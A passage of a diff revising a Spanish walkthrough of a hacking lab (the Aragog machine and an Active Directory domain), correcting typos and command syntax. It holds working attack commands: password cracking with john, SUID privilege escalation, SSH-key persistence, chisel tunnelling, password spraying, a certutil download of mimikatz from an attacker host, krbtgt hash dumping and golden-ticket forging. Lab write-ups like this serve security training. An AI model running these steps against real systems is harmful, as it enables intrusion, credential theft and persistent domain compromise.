 Una vez dentro con el comando `ls` podemos ver que hay una archivo `wp-config.php`, nos fijaremos en lo que hay dentro de el como hemos hecho anterior mente utilizando el comando `cat`.
 
 ```
-cat wp-config-php
+cat wp-config.php
 ```
 
 Se mostrará un archivo como el que veremos a continuación:
@@ -563,7 +569,7 @@ Dentro de esta tenemos varias tablas, vamos a entrar a la de wp\_users, si hacem
 Listaremos lo que hay dentro.
 
 ```
-select * form wp_users;
+SELECT * FROM wp_users;
 ```
 
 <figure><img src="https://818657019-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FuM2fhMp0j7Q5I6745I05%2Fuploads%2FubM73kAgj4FgWt1ZW0Ss%2Fimage.png?alt=media&amp;token=e9c931f8-b70e-4800-9f6a-6680dbcf12db" alt=""><figcaption></figcaption></figure>
@@ -573,26 +579,26 @@ Si nos fijamos bien vemos que la contraseña del usuario hagrid98 esta en hash, 
 ```
 mkdir Resources
 cd !$
-mdkir Credentials
+mkdir Credentials
 cd !$
 ```
 
 ```
 nvim hash
-catn hash
+cat hash
 ```
 
 Una vez aquí dentro vamos a utilizar una herramienta llamada `john` junto al diccionario `rockyou` que se encuentra en la ruta absoluta `/usr/share/wordlists/rockyou.txt`.
 
 ```
-john -w:/usr/share/wordlists/rockyou.txt hash
+john --wordlist=/usr/share/wordlists/rockyou.txt hash
 ```
 
 <figure><img src="https://818657019-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FuM2fhMp0j7Q5I6745I05%2Fuploads%2FzpKWLoFc8HPqOcyaWnk2%2Fimage.png?alt=media&amp;token=171a096c-a66e-4f04-9089-27b799eae5a2" alt=""><figcaption></figcaption></figure>
 
 ![](https://visma.gitbook.io/visma/~gitbook/image?url=https%3A%2F%2Fgithub.com%2FVicctoriaa%2FVISMA%2Fassets%2F153718557%2F5c6498e2-d327-4a7b-90bc-bf3905c418af\&width=768\&dpr=4\&quality=100\&sign=99547560\&sv=2)
 
-Podemis ver que la herrmaineta john nos ha encontrado la contrasela de hagrid98, que es password123. Una vez tenemos el usuraio y la contraseña probaremos a conectarnos por `ssh`.
+Podemos ver que la herramienta John the Ripper ha encontrado la contraseña de `hagrid98` (`password123`). Una vez obtenidas las credenciales me conecté por SSH:
 
 ```
 ssh hagrid98@IP_DE_LA_ARAGOG
@@ -600,7 +606,7 @@ ssh hagrid98@IP_DE_LA_ARAGOG
 
 <figure><img src="https://818657019-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FuM2fhMp0j7Q5I6745I05%2Fuploads%2Fg7xCrGHBbbcCCI8AVmBF%2Fimage.png?alt=media&amp;token=c965879b-7670-4ccf-8e5a-f02cc93b5924" alt=""><figcaption></figcaption></figure>
 
-> Vemos que nos deja conctarnos, es importante poner la contarseña que encontramos anteriormente y no la de nuestra máquina.
+> Vemos que nos deja conectarnos, es importante poner la contraseña que encontramos anteriormente y no la de nuestra máquina.
 
 #### Escalada de privilegios <a href="#escalada-de-privilegios" id="escalada-de-privilegios"></a>
 
@@ -632,26 +638,26 @@ watch -n 1 ls -l
 
 Vemos que si esta en root, al saber que ya tenemmos la ruta con permisos SUID, ejecutamos `bash -p`, nos permitirá ejecutar la bash como el owner. Observamos lo siguiente:![](https://818657019-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FuM2fhMp0j7Q5I6745I05%2Fuploads%2F9Zrmb2f6jX5II8PfW0yd%2Fimage.png?alt=media\&token=9e944a48-6252-4924-93ea-06131d89825d)
 
-Si abrimos la ultima flag que vemos, con el comando `cat horcrux2.txt`nos da la enhorabuena 😊👍 Ya que hemos conseguido vulnerar la maqona por completo. Si queremos entrar las veces que queramos sin contraseña, lo explicamos en el siguiente punto.
+Si abrimos la ultima flag que vemos, con el comando `cat horcrux2.txt`nos da la enhorabuena 😊👍 Ya que hemos conseguido vulnerar la máquina por completo. Si queremos entrar las veces que queramos sin contraseña, lo explicamos en el siguiente punto.
 
 #### Persistencia <a href="#entrar-sin-contrasena" id="entrar-sin-contrasena"></a>
 
 Creamos una clave publica en nuestro equipo de ssh y la meteremos dentro del directorio `/root/.ssh`
 
 ```
-sudo nano id:rsa.pub
+sudo nano id_rsa.pub
 ```
 
 Una vez creada quitamos el salto de línea del archivo `/root/.ssh/id_rsa.pub`, ejecuntamos el siguiente comando:
 
 ```
-cat /root/.ssh/id_rsa.pub | tr '\\n'
+cat ~/.ssh/id_rsa.pub | tr -d '\n'
 ```
 
 Y lo copiamos al portapapeles
 
 ```
-cat /root/.ssh/id_rsa.pub | tr '\\n' | xclip -sel clip
+cat ~/.ssh/id_rsa.pub | tr -d '\n' | xclip -sel clip
 ```
 
 Abrimos con nano un archivo llamado ".ssh/authorized\_keys" y pegamos la clave (máquina victima)
@@ -681,7 +687,7 @@ mv chisel_1.9.1_linux_amd64 chisel
 Una vez lo tenemos, desde la conexión ssh que tenemos con la aragog, creamos una nueva carpeta en tmp y nos metemos dentroo.
 
 ```
-mktemp -d | xargs cd
+cd $(mktemp -d)
 ```
 
 <figure><img src="https://818657019-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FuM2fhMp0j7Q5I6745I05%2Fuploads%2FRFhxBYEuNfG1kVcEoNVa%2Fimage.png?alt=media&amp;token=136e510f-4538-4479-8095-471779fed42a" alt=""><figcaption></figcaption></figure>
@@ -701,7 +707,7 @@ Si ahora hacemos un ls en la Aragog, encontramos que lo tenemos
 Ahora vamos a iniciar el servidor en nuestra maquina
 
 ```
-./chisel server -reverse -p 1234
+./chisel server --reverse -p 1234
 ```
 
 <figure><img src="https://818657019-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FuM2fhMp0j7Q5I6745I05%2Fuploads%2FyrqlXfF1cxstutuiFemF%2Fimage.png?alt=media&amp;token=5c0fcb62-99c2-4d0e-a0d9-8424491d6402" alt=""><figcaption></figcaption></figure>
@@ -797,7 +803,7 @@ cat hashisma
 
 <figure><img src="https://818657019-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FuM2fhMp0j7Q5I6745I05%2Fuploads%2FEU9XHImeDqXcyV1FbywX%2Fimage.avif?alt=media&amp;token=cb2efe8e-1d2c-46f6-86a7-2c05b7c55cf9" alt=""><figcaption></figcaption></figure>
 
-Al añadir el parámetro “—wordlist=’’”, le damos acceso a un diccionario que por fuerza ruta nos ayudará a romperlo y finalmente encontrar que la contraseña es “baseball1?”.
+Al añadir el parámetro “—wordlist=’’”, le damos acceso a un diccionario que por fuerza bruta nos ayudará a romperlo y finalmente encontrar que la contraseña es “baseball1?”.
 
 Una vez tenemos la contraseña, con la ayuda de `crackmapexec` ejecutamos un `passwordspraying`, encontramos que el usuario es válido para login y adémas somos administrador en el equipo ‘192.168.2.41’.
 
@@ -892,7 +898,7 @@ Encontramos que el usuario “administrator” pertenece también al grupo con r
 Hacemos un password spraying y encontramos que nos aparece Pnwd! En todos, eso quiere decir que tenemos permisos de administrador en todos los dispositivos
 
 ```
- proxychain crackmpexec smb 192.168.2.0/24 -u 'test' -p 'P$$w0rd' 2>/dev/null | grep -v 'wisma'
+ proxychains crackmapexec smb 192.168.2.0/24 -u 'test' -p 'P$$w0rd' 2>/dev/null | grep -v 'wisma'
 ```
 
 <figure><img src="https://818657019-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FuM2fhMp0j7Q5I6745I05%2Fuploads%2FqdJPpDepVsGd7FMHaafl%2Fimage.avif?alt=media&amp;token=65c9db5c-311b-4aa9-9768-6ff085cff267" alt=""><figcaption></figcaption></figure>
@@ -1035,14 +1041,14 @@ certutil.exe -f -urlcache -split http://192.168.2.43:2121/mimikatz.exe mimikatz.
 Una vez lo ejecutamos, le ponemos el siguiente comando:
 
 ```
-Isadump Isa /inject /name:krbtgt
+lsadump::lsa /inject /name:krbtgt
 ```
 
 Este extrae información sobre la cuenta de servicio "krbtgt" del sistema de autenticación de Windows, como el hash NTLM de este mismo, el SID del dominio y más.
 
 <figure><img src="https://818657019-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FuM2fhMp0j7Q5I6745I05%2Fuploads%2Fs2B7r8itYiF2zIBlNIBQ%2Fimage.png?alt=media&amp;token=e9a04d85-6113-4f3c-8d67-862f253b6533" alt=""><figcaption></figcaption></figure>
 
-Una vez temenos esta información la vamos a usar para generar un archivo llamado Golden.kirbi, este es un archivo de tickets Kerberos dorado, lo pasamos por smb a la Aragog
+Una vez obtenida esta información la vamos a usar para generar un archivo llamado Golden.kirbi, este es un archivo de tickets Kerberos dorado, lo pasamos por smb a la Aragog
 
 ```
 copy golden.kirbi \\192.168.2.43\smbFolder\golden.kirbi
@@ -1063,7 +1069,7 @@ Nos generará un archivo “Administrator.ccache” este lo usaremos para hacer 
 El hecho de tener el archivo “Administrator.ccache” nos permite hacer pass the ticket incluso si la contraseña del usuario Administrator cambia. Por lo que tenemos permanencia.
 
 ```
-export KRB5CCNAME="./Administrator.ccahe"
+export KRB5CCNAME="./Administrator.ccache"
 cat /etc/hosts # Nos aseguramos que el DC esta con su IP
 examples/psexec.py -k -n (dominio)/Administrator@DCCompany cmd.exe
 ```
@@ -1080,6 +1086,6 @@ rdesktop 192.168.2.253
 
 <figure><img src="https://818657019-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FuM2fhMp0j7Q5I6745I05%2Fuploads%2F0DXARTmhkWZEX4wmWvNS%2Fimage.png?alt=media&amp;token=c75f27e6-bcfa-46ff-8ebe-588086debf33" alt=""><figcaption></figcaption></figure>
 
-Y ya, finalmente ya hemos acabado hackeando el entorno entero y creando permanencia tanto en la Aragog como en el DC, lo que quiere decir que si cambian la contraseña de Administrator seguiremos podiendo conectarnos.
+Y ya, finalmente ya hemos acabado hackeando el entorno entero y creando permanencia tanto en la Aragog como en el DC, lo que quiere decir que si cambian la contraseña de Administrator seguiré pudiendo conectarme.
 
 
